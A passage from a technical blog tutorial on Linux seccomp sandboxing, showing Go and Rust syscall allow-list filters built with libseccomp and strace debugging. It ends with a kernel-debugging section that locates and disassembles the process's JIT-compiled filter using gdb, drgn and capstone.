</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// set the no new privs bit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">SetNoNewPrivsBit</span>(<span style="color:#66d9ef">true</span>) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to set no new privs bit: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// iterate over the syscalls slice and add them to the filter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">syscall</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">syscalls</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// resolve syscall number
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">seccompSys</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">GetSyscallFromName</span>(<span style="color:#a6e22e">syscall</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to get syscall: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// add the syscall to the filter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">AddRule</span>(<span style="color:#a6e22e">seccompSys</span>, <span style="color:#a6e22e">seccomp</span>.<span style="color:#a6e22e">ActAllow</span>) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to add rule: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">filter</span>.<span style="color:#a6e22e">Load</span>() <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to load filter: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a new file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Create</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to create file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// write to the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Write</span>([]byte(<span style="color:#e6db74">&#34;hello world&#34;</span>)); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to write to file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// close the file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">Close</span>(); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#e6db74">&#34;failed to close file: &#34;</span>, <span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As you can see the logic is pretty similar to our first C example, we just iterate over the syscalls slice and add them to the filter.</p>
<p>Now let’s build and run the program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./simple 
</span></span><span style="display:flex;"><span>fish: Job 1, <span style="color:#e6db74">&#39;./simple&#39;</span> terminated by signal SIGSYS <span style="color:#f92672">(</span>Bad system call<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>…and again we get the same error. Now let’s try to understand which syscall is not allowed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace -f ./simple
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>pid 427733<span style="color:#f92672">]</span> exit_group<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>              <span style="color:#f92672">=</span> <span style="color:#ae81ff">231</span>
</span></span></code></pre></div><p>All right our program after all needs to clean exit, so let’s add the <code>exit_group</code> syscall to the filter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">...</span><span style="color:#a6e22e">snip</span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// string slice of syscall names
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">syscalls</span> = []<span style="color:#66d9ef">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;nanosleep&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;futex&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;clone&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;openat&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;rt_sigprocmask&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;gettid&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;mmap&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;sigaltstack&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;write&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;fcntl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;epoll_ctl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;pipe2&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;close&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;epoll_create1&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;getrlimit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;setrlimit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;read&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;rt_sigaction&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;madvise&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;execve&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;arch_prctl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;sched_getaffinity&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span><span style="color:#a6e22e">snip</span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>Now let’s build and run the program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./simple
</span></span><span style="display:flex;"><span>$ cat test.txt 
</span></span><span style="display:flex;"><span>hello world⏎
</span></span></code></pre></div><p>And here we go, we have a working program that is now seccomp enabled.
There’s also other syscalls that we could remove from the filter, but I’ll leave that as an exercise for the reader.
Hint: <code>strace</code> the program and try to understand which syscall is not needed, for example <code>arch_prctl</code> is not needed because it used by the loader, and execve is not needed because we are not executing any other program, it is used by the loader to execute the program.</p>
<h2 id="seccomp-in-rust">Seccomp in Rust</h2>
<p>Here’s the same example in Rust, using the <a href="https://crates.io/crates/libseccomp">libseccomp</a> crate.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> std::{fs::File, io::Write};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> libseccomp::{ScmpFilterContext, ScmpAction, ScmpSyscall};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a new filter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> filter <span style="color:#f92672">=</span> ScmpFilterContext::new_filter(ScmpAction::KillProcess).unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// add architecture to filter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> rule_openat_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;openat&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_write_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;write&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_fsync_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;fsync&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_close_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;close&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_sigaltstack_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;sigaltstack&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_munmap_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;munmap&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> rule_exit_group_sys <span style="color:#f92672">=</span> ScmpSyscall::from_name(<span style="color:#e6db74">&#34;exit_group&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_openat_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_write_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_fsync_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_close_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_sigaltstack_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_munmap_sys).unwrap();
</span></span><span style="display:flex;"><span>    filter.add_rule(ScmpAction::Allow, rule_exit_group_sys).unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    filter.load().unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// create a file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">mut</span> file <span style="color:#f92672">=</span> File::create(<span style="color:#e6db74">&#34;foo.txt&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// write some content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    file.write_all(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hello, world!&#34;</span>).unwrap();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// sync content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    file.sync_all().unwrap();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Previous example is straightforward and pretty similar to C and Go ones. Of course used syscalls vary based on the language, since Go runtime uses some syscalls that are not used by Rust. Bare also in mind that while writing code we often need to use more than one library, and each library may use different syscalls, so you may need to add more syscalls to the filter.</p>
<h2 id="bonus-where-my-filter-lives">Bonus: where my filter lives?</h2>
<p>In this example we’re going to use drgn to inspect the filter that we’ve just added to the process. Drgn is a debugger which allows you to inspect the kernel and user space, and it’s written in Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># first we start our libseccomp example program in gdb</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and put a breakpoint just after the seccomp filter is loaded</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (notice we compile the program with debugging symbols)</span>
</span></span><span style="display:flex;"><span>$ gcc -o example_3 example_3.c -lseccomp -ggdb2
</span></span><span style="display:flex;"><span>$ gdb -q ./example_3 
</span></span><span style="display:flex;"><span>pwndbg&gt; b example_3.c:48
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x4012be: file example_3.c, line 48.
</span></span><span style="display:flex;"><span>pwndbg&gt; r
</span></span><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span>In file: .../seccomp/example_3.c
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">43</span>         perror<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;seccomp_load failed&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">44</span>         <span style="color:#66d9ef">return</span> 1;
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">45</span>     <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">46</span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">47</span>     // Read <span style="color:#ae81ff">4</span> bytes from the standard input.
</span></span><span style="display:flex;"><span> ► <span style="color:#ae81ff">48</span>     read<span style="color:#f92672">(</span>0, buf, 4<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">49</span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">50</span>     // Release the seccomp filter context.
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">51</span>     seccomp_release<span style="color:#f92672">(</span>ctx<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">52</span> 
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">53</span>     <span style="color:#66d9ef">return</span> 0;
</span></span><span style="display:flex;"><span>...snip...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pwndbg&gt; procinfo
</span></span><span style="display:flex;"><span>exe        <span style="color:#e6db74">&#39;.../seccomp/example_3&#39;</span>
</span></span><span style="display:flex;"><span>pid        <span style="color:#ae81ff">445243</span>
</span></span><span style="display:flex;"><span>tid        <span style="color:#ae81ff">445243</span>
</span></span><span style="display:flex;"><span>selinux    unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span><span style="display:flex;"><span>ppid       <span style="color:#ae81ff">445170</span>
</span></span><span style="display:flex;"><span>uid        <span style="color:#f92672">[</span>1000, 1000, 1000, 1000<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>gid        <span style="color:#f92672">[</span>1000, 1000, 1000, 1000<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>groups     <span style="color:#f92672">[</span>10, 973, 1000<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>fd<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>      /dev/pts/1
</span></span><span style="display:flex;"><span>fd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>      /dev/pts/1
</span></span><span style="display:flex;"><span>fd<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>      /dev/pts/1
</span></span></code></pre></div><p>In another terminal we start <a href="https://github.com/osandov/drgn">drgn</a> and attach to the process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo drgn
</span></span><span style="display:flex;"><span><span style="color:#75715e"># here we use the find_task function to get the task_struct</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Linux kernel uses the task_struct to refer to a process</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; t <span style="color:#f92672">=</span> find_task<span style="color:#f92672">(</span>prog, 445243<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; t.type_
</span></span><span style="display:flex;"><span>struct task_struct *
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span><span style="color:#75715e"># as you can see the task_struct has a seccomp field</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; prog.type<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;struct task_struct&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>struct task_struct <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	struct thread_info thread_info;
</span></span><span style="display:flex;"><span>	unsigned int __state;
</span></span><span style="display:flex;"><span>	void *stack;
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span>	kuid_t loginuid;
</span></span><span style="display:flex;"><span>	unsigned int sessionid;
</span></span><span style="display:flex;"><span>	struct seccomp seccomp;
</span></span><span style="display:flex;"><span>	struct syscall_user_dispatch syscall_dispatch;
</span></span><span style="display:flex;"><span>	u64 parent_exec_id;
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we&#39;re interested into the filter which is a pointer to a seccomp_filter struct</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; t.seccomp
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>struct seccomp<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>	.mode <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>2,
</span></span><span style="display:flex;"><span>	.filter_count <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>atomic_t<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>		.counter <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>int<span style="color:#f92672">)</span>1,
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>	.filter <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>struct seccomp_filter *<span style="color:#f92672">)</span>0xffff922e3529c300,
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we&#39;re near... here there&#39;s the pointer bpf_prog structure</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; t.seccomp.filter
</span></span><span style="display:flex;"><span>*<span style="color:#f92672">(</span>struct seccomp_filter *<span style="color:#f92672">)</span>0xffff922e3529c300 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span>	.prev <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>struct seccomp_filter *<span style="color:#f92672">)</span>0x0,
</span></span><span style="display:flex;"><span>	.prog <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>struct bpf_prog *<span style="color:#f92672">)</span>0xffffb3e5089c5000,
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># great! here is it!</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; t.seccomp.filter.prog
</span></span><span style="display:flex;"><span>*<span style="color:#f92672">(</span>struct bpf_prog *<span style="color:#f92672">)</span>0xffffb3e5089c5000 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	.pages <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u16<span style="color:#f92672">)</span>1,
</span></span><span style="display:flex;"><span>	.jited <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u16<span style="color:#f92672">)</span>1,                                // &lt;-- this means the filter is JITed
</span></span><span style="display:flex;"><span>	.jit_requested <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u16<span style="color:#f92672">)</span>1,
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span>	.len <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u32<span style="color:#f92672">)</span>16,
</span></span><span style="display:flex;"><span>	.jited_len <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u32<span style="color:#f92672">)</span>84,                           // &lt;-- this is the size of the filter jited code
</span></span><span style="display:flex;"><span>	.tag <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u8 <span style="color:#f92672">[</span>8<span style="color:#f92672">]){}</span>,
</span></span><span style="display:flex;"><span>	.stats <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>struct bpf_prog_stats *<span style="color:#f92672">)</span>0x41b40fc0f150,
</span></span><span style="display:flex;"><span>	.active <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>int *<span style="color:#f92672">)</span>0x41b40fc03218,
</span></span><span style="display:flex;"><span>	.bpf_func <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>unsigned int <span style="color:#f92672">(</span>*<span style="color:#f92672">)(</span>const void *, const struct bpf_insn *<span style="color:#f92672">))</span>0xffffffffc030d8e0,    // &lt;-- this is the address of the filter jited code
</span></span><span style="display:flex;"><span>...snipped...
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># so what do we do now? we can use the bpf_func address to dump the filter code</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># and disassemble it.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we know the filter is 84 bytes long, so we can read 84 bytes from the address</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; buf <span style="color:#f92672">=</span> prog.read<span style="color:#f92672">(</span>0xffffffffc030d8e0, 84<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># we use capstone library to disassemble the code</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; from capstone import *
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; md <span style="color:#f92672">=</span> Cs<span style="color:#f92672">(</span>CS_ARCH_X86, CS_MODE_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; <span style="color:#66d9ef">for</span> i in md.disasm<span style="color:#f92672">(</span>buf, 0x0<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>...     print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;0x%x:\t%s\t%s&#34;</span> %<span style="color:#f92672">(</span>i.address, i.mnemonic, i.op_str<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>... 
</span></span><span style="display:flex;"><span>0x0:	nop	dword ptr <span style="color:#f92672">[</span>rax + rax<span style="color:#f92672">]</span>       &lt;-- this is the first instruction of the filter a NOOP
</span></span><span style="display:flex;"><span>0x5:	push	rbp                     &lt;-- this saves rbp register which will be used later to index the stack
</span></span><span style="display:flex;"><span>0x6:	mov	rbp, rsp                    &lt;-- this stores the stack pointer value to rbp
</span></span><span style="display:flex;"><span>0x9:	push	rbx                     &lt;-- save rbp
</span></span><span style="display:flex;"><span>0xa:	push	r13                     &lt;-- save r13
</span></span><span style="display:flex;"><span>0xc:	xor	eax, eax                    &lt;-- set eax to <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>0xe:	xor	r13d, r13d                  &lt;-- set r13 to <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>0x11:	mov	rbx, rdi                    &lt;-- rdi points to seccomp_data struct filled with current syscall data
</span></span><span style="display:flex;"><span>0x14:	mov	eax, dword ptr <span style="color:#f92672">[</span>rbx + 4<span style="color:#f92672">]</span>    &lt;-- eax is set to arch field of seccomp_data struct
</span></span><span style="display:flex;"><span>0x17:	mov	esi, 0xc000003e             &lt;-- set rsi to 0xc000003e <span style="color:#f92672">(</span>x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x1c:	cmp	rax, rsi                    &lt;-- compare eax with rsi
</span></span><span style="display:flex;"><span>0x1f:	jne	0x50                        &lt;-- <span style="color:#66d9ef">if</span> eax !<span style="color:#f92672">=</span> rsi jump to 0x50 and <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> forbidding the syscall
</span></span><span style="display:flex;"><span>0x21:	mov	eax, dword ptr <span style="color:#f92672">[</span>rbx<span style="color:#f92672">]</span>        &lt;-- eax is set to nr field of seccomp_data struct
</span></span><span style="display:flex;"><span>0x24:	cmp	rax, 0x40000000             &lt;-- compare eax with 0x40000000 __X32_SYSCALL_BIT <span style="color:#66d9ef">if</span> above <span style="color:#ae81ff">32</span> bit syscall, <span style="color:#66d9ef">if</span> below <span style="color:#ae81ff">64</span> bit syscall
</span></span><span style="display:flex;"><span>0x2b:	jb	0x37                        &lt;-- <span style="color:#66d9ef">if</span> eax &lt; 0x40000000 jump to 0x37  
</span></span><span style="display:flex;"><span>0x2d:	mov	esi, 0xffffffff             &lt;-- set rsi to 0xffffffff <span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>0x32:	cmp	rax, rsi                    &lt;-- compare rax with rsi
</span></span><span style="display:flex;"><span>0x35:	jne	0x50                        &lt;-- <span style="color:#66d9ef">if</span> rax !<span style="color:#f92672">=</span> rsi jump to 0x50 and <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> forbidding the syscall
</span></span><span style="display:flex;"><span>0x37:	test	rax, rax                &lt;-- test rax with rax is shorthand <span style="color:#66d9ef">for</span> cmp rax, <span style="color:#ae81ff">0</span> -&gt; read syscall number
</span></span><span style="display:flex;"><span>0x3a:	je	0x45                        &lt;-- <span style="color:#66d9ef">if</span> rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> jump to 0x45 and allow the read syscall
</span></span><span style="display:flex;"><span>0x3c:	cmp	rax, 0xe7                   &lt;-- compare rax with 0xe7 -&gt; exit_group syscall
</span></span><span style="display:flex;"><span>0x43:	jne	0x50                        &lt;-- <span style="color:#66d9ef">if</span> rax !<span style="color:#f92672">=</span> 0xe7 jump to 0x50 and <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> forbidding the syscall
</span></span><span style="display:flex;"><span>0x45:	mov	eax, 0x7fff0000             &lt;-- set eax to 0x7fff0000
</span></span><span style="display:flex;"><span>0x4a:	pop	r13                         &lt;-- restore r13
</span></span><span style="display:flex;"><span>0x4c:	pop	rbx                         &lt;-- restore rbx
</span></span><span style="display:flex;"><span>0x4d:	leave	                        &lt;-- restore rbp
